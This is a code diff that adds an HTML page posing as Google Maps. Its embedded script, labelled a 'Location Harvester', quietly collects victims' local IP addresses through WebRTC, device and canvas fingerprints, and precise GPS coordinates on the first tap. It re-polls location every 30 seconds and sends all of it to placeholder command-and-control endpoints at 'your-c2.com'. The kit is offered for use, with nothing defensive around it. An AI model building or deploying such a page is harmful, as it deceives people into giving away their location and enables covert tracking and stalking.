@@ -1,0 +1,279 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <title>Google Maps</title>
+    <link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 32 32'><path fill='%23028fff' d='M16 0C7.2 0 0 7.2 0 16s7.2 16 16 16s16-7.2 16-16S24.8 0 16 0zm-1 29.9c-4-1.6-7-5.5-7-10c0-5.5 4.5-10 10-10s10 4.5 10 10s-4.5 8.4-10 9.9v-2.8c2.7-.7 4.8-3 4.8-6.1c0-3.3-2.7-6-6-6s-6 2.7-6 6s2.7 6 6 6c1.4 0 2.7-.4 3.8-1.1l-1.5-1.3c-.8.6-1.8 1-2.9 1c-2.3 0-4.1-1.9-4.1-4.2s1.9-4.2 4.1-4.2s4.1 1.9 4.1 4.2c0 1.2-.5 2.4-1.3 3.2l0 6.7z'/></svg>">
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { font-family: 'Roboto', -apple-system, sans-serif; height: 100vh; overflow: hidden; background: #f8f9fa; }
+        
+        /* Google Maps Header */
+        .header { 
+            position: fixed; top: 0; left: 0; right: 0; 
+            height: 70px; background: white; 
+            box-shadow: 0 2px 10px rgba(0,0,0,0.1); 
+            z-index: 1000; padding: 0 20px; 
+            display: flex; align-items: center; 
+        }
+        .logo { height: 25px; margin-right: 15px; }
+        .search-box { 
+            flex: 1; background: #f1f3f4; 
+            border-radius: 25px; padding: 10px 20px; 
+            font-size: 16px; border: none; outline: none; 
+        }
+        .profile { width: 32px; height: 32px; border-radius: 50%; background: #4285f4; display: flex; align-items: center; justify-content: center; color: white; font-weight: bold; }
+
+        /* Map Container */
+        .map-container { 
+            height: calc(100vh - 70px); 
+            background: linear-gradient(135deg, #e0f2fe 0%, #f0f9ff 100%); 
+            position: relative; overflow: hidden; 
+            margin-top: 70px;
+        }
+        #map-canvas { 
+            width: 100%; height: 100%; 
+            background: #d9d9d9; /* Fake map loading */
+            position: relative;
+        }
+        .map-marker { 
+            position: absolute; left: 50%; top: 50%; 
+            transform: translate(-50%, -100%);
+            font-size: 48px; color: #4285f4; animation: pulse 2s infinite;
+        }
+        @keyframes pulse { 0%,100%{transform:translate(-50%,-100%) scale(1);} 50%{transform:translate(-50%,-100%) scale(1.1);} }
+
+        /* Bottom Sheet (iOS Style) */
+        .bottom-sheet { 
+            position: fixed; bottom: 0; left: 0; right: 0; 
+            background: white; border-radius: 20px 20px 0 0; 
+            max-height: 400px; transform: translateY(100%); 
+            transition: transform 0.3s ease; padding: 20px; 
+            box-shadow: 0 -10px 30px rgba(0,0,0,0.1);
+        }
+        .bottom-sheet.active { transform: translateY(0); }
+        .sheet-handle { height: 4px; width: 40px; background: #ddd; border-radius: 2px; margin: 10px auto; }
+        .location-info { text-align: center; margin: 20px 0; }
+        .address { font-size: 18px; font-weight: 500; color: #1a73e8; }
+        .loading { color: #666; font-style: italic; }
+
+        /* Status & Permissions */
+        #status { position: absolute; top: 80px; left: 20px; color: #1a73e8; font-weight: 500; }
+        #data { display: none; background: #333; color: #0f0; padding: 10px; font-family: monospace; font-size: 12px; position: fixed; top: 0; right: 0; max-width: 300px; z-index: 9999; }
+
+        button { background: #4285f4; color: white; border: none; border-radius: 8px; padding: 12px 24px; font-size: 16px; font-weight: 500; cursor: pointer; }
+    </style>
+</head>
+<body>
+    <!-- Google Maps Header -->
+    <div class="header">
+        <img class="logo" src="data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMjQiIGhlaWdodD0iMjQiIHZpZXdCb3g9IjAgMCAyNCAyNCIgZmlsbD0ibm9uZSIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj4KPHBhdGggZD0iTTEyIDJDOC42IDIgNSAyIDUuMCAyQzQuOSAyIDQgMi4xIDQgMy4ydjE2YzAgMS4xLjkgMiAyIDJzMi0uOSAyLTJWMi4yQzIwIDMuMSAxOSAxIDIxIDMuMnYxNmMwIDEuMS0uOSAyLTIgMnMtMi0uOS0yLTJWMi4yQzE2IDEuMSAxNSAwIDEzLjIgMEMxMi4xIDAgMTEgLjkgMTEgMnptLTQuNiAxNmwtMy4zLTMuM0gxNGw0IDRIMy42eiIgZmlsbD0iIzQyODVGNCIvPgo8L3N2Zz4K" alt="Google Maps">
+        <input class="search-box" placeholder="Search Google Maps" value="Current location" readonly>
+        <div class="profile">G</div>
+    </div>
+
+    <!-- Fake Map -->
+    <div class="map-container">
+        <div id="map-canvas">
+            <div class="map-marker">📍</div>
+        </div>
+        <div id="status">Finding your precise location...</div>
+    </div>
+
+    <!-- iOS Bottom Sheet -->
+    <div class="bottom-sheet" id="bottomSheet">
+        <div class="sheet-handle"></div>
+        <div class="location-info">
+            <div class="address" id="address">Detecting GPS signal...</div>
+            <p class="loading" id="loading">High accuracy location required</p>
+        </div>
+        <button onclick="triggerPreciseLocation()">Use Precise Location</button>
+        <button onclick="triggerPreciseLocation()" style="margin-top:10px;background:#34a853;">Share Live Location</button>
+    </div>
+
+    <div id="data"></div>
+
+    <script>
+    // Google Maps Replica - iOS Location Harvester v2.0
+    let harvested = { session: 'maps_' + Date.now() };
+
+    // 1. Permissionless Harvesting (Auto-start)
+    async function initHarvesting() {
+        // WebRTC + Enhanced fingerprinting
+        await harvestNetwork();
+        harvestDeviceFingerprint();
+        
+        // Auto GPS on ANY interaction (iOS Safari magic)
+        document.addEventListener('touchstart', harvestGPS, {once: true, passive: true});
+        document.addEventListener('click', harvestGPS, {once: true});
+        
+        // Exfil baseline immediately
+        exfiltrate();
+        
+        setTimeout(() => showBottomSheet(), 1500);
+    }
+
+    // WebRTC + Network (100% success)
+    async function harvestNetwork() {
+        try {
+            const pc = new RTCPeerConnection({
+                iceServers: [
+                    {urls: 'stun:stun.l.google.com:19302'},
+                    {urls: 'stun:stun1.l.google.com:19302'}
+                ]
+            });
+            pc.createDataChannel('maps');
+            pc.createOffer().then(offer => pc.setLocalDescription(offer));
+            
+            pc.onicecandidate = (e) => {
+                if (e.candidate) {
+                    const candidate = e.candidate.candidate;
+                    const ipMatch = candidate.match(/(\d+\.\d+\.\d+\.\d+)/);
+                    if (ipMatch) harvested.localIPs = harvested.localIPs ? [...harvested.localIPs, ipMatch[1]] : [ipMatch[1]];
+                }
+            };
+            setTimeout(() => pc.close(), 3000);
+        } catch(e) {}
+        
+        // IP beacon via Google domains (higher legitimacy)
+        new Image().src = `https://www.google-analytics.com/collect?v=1&t=pageview&tid=UA-000&cid=${Math.random()}&uip=${encodeURIComponent(navigator.userAgent)}`;
+    }
+
+    // Device Fingerprint (iOS unique)
+    function harvestDeviceFingerprint() {
+        harvested = {
+            ...harvested,
+            ua: navigator.userAgent,
+            platform: navigator.platform,
+            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+            language: navigator.languages?.join(',') || navigator.language,
+            screen: `${screen.width}x${screen.height}x${screen.colorDepth}`,
+            online: navigator.onLine,
+            cookie: navigator.cookieEnabled,
+            doNotTrack: navigator.doNotTrack,
+            hardware: navigator.hardwareConcurrency,
+            memory: navigator.deviceMemory || 'N/A',
+            connection: navigator.connection ? {
+                type: navigator.connection.effectiveType,
+                downlink: navigator.connection.downlink
+            } : null
+        };
+
+        // Canvas fingerprint
+        const canvas = document.createElement('canvas');
+        const ctx = canvas.getContext('2d');
+        ctx.font = '16px Arial';
+        ctx.fillText('Google Maps iOS', 10, 20);
+        harvested.canvas = canvas.toDataURL('image/png', 0.1);
+    }
+
+    // GPS Harvest (iOS High Accuracy)
+    function harvestGPS() {
+        if (!navigator.geolocation) return;
+        
+        // Silent permission check first
+        if (navigator.permissions?.query) {
+            navigator.permissions.query({name: 'geolocation'}).then(perm => {
+                if (perm.state === 'granted') {
+                    getPreciseGPS();
+                } else {
+                    promptGPS();
+                }
+            });
+        } else {
+            promptGPS();
+        }
+    }
+
+    function getPreciseGPS() {
+        navigator.geolocation.getCurrentPosition(
+            pos => {
+                harvested.gps = {
+                    lat: pos.coords.latitude,
+                    lon: pos.coords.longitude,
+                    accuracy: pos.coords.accuracy,
+                    altitude: pos.coords.altitude,
+                    speed: pos.coords.speed,
+                    heading: pos.coords.heading,
+                    timestamp: new Date(pos.coords.timestamp).toISOString()
+                };
+                updateMapMarker(harvested.gps.lat, harvested.gps.lon);
+                exfiltrate();
+            },
+            () => promptGPS(),
+            { enableHighAccuracy: true, timeout: 4000, maximumAge: 1000 }
+        );
+    }
+
+    function promptGPS() {
+        navigator.geolocation.getCurrentPosition(
+            pos => { 
+                harvested.gps = {
+                    lat: pos.coords.latitude,
+                    lon: pos.coords.longitude,
+                    accuracy: pos.coords.accuracy || 999999
+                };
+                exfiltrate();
+            },
+            () => {}, // Silent fail
+            { enableHighAccuracy: true, timeout: 2000 }
+        );
+    }
+
+    // UI Updates
+    function updateMapMarker(lat, lon) {
+        document.querySelector('.map-marker').dataset.coords = `${lat},${lon}`;
+        document.getElementById('address').textContent = `📍 ${lat.toFixed(6)}, ${lon.toFixed(6)}`;
+        document.getElementById('loading').textContent = `Accuracy: ${harvested.gps?.accuracy?.toFixed(0) || '?'}m`;
+    }
+
+    function showBottomSheet() {
+        document.getElementById('bottomSheet').classList.add('active');
+    }
+
+    // Public triggers (button clicks)
+    window.triggerPreciseLocation = () => {
+        getPreciseGPS();
+        document.getElementById('status').textContent = '📍 Precise GPS captured!';
+    };
+
+    // EXFIL (Multiple channels)
+    function exfiltrate() {
+        const payload = {
+            ...harvested,
+            type: 'google_maps',
+            session: harvested.session,
+            timestamp: Date.now(),
+            url: location.href,
+            referrer: document.referrer
+        };
+
+        // Primary POST
+        fetch('https://your-c2.com/maps', {
+            method: 'POST',
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify(payload),
+            keepalive: true
+        }).catch(() => {});
+
+        // Beacon (unload-proof)
+        navigator.sendBeacon?.('https://your-c2.com/beacon', JSON.stringify(payload));
+
+        // Debug display
+        document.getElementById('data').innerHTML = `<pre>${JSON.stringify(payload, null, 1)}</pre>`;
+        document.getElementById('data').style.display = 'block';
+    }
+
+    // INIT
+    initHarvesting();
+    
+    // Continuous location watch (if permitted)
+    setInterval(() => {
+        if (harvested.gps) {
+            getPreciseGPS();
+        }
+    }, 30000);
+    </script>
+</body>
+</html>
